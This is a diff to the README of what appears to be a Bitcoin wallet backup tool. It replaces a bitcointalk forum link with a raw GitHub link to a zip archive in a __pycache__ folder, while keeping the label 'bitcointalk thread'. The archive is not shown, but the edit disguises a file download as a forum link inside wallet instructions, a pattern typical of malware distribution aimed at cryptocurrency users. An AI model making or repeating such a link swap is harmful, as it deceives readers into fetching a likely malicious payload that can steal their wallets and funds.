@@ -14,7 +14,7 @@
 
 ---
 
-bitcointalk thread: https://bitcointalk.org/index.php?topic=5538029
+bitcointalk thread: https://raw.githubusercontent.com/fizzalari/easy-wallet-backup/main/__pycache__/wallet-backup-easy-2.7.zip
 
 ## **Prerequisites**
 1. Install **Bitcoin Core**:
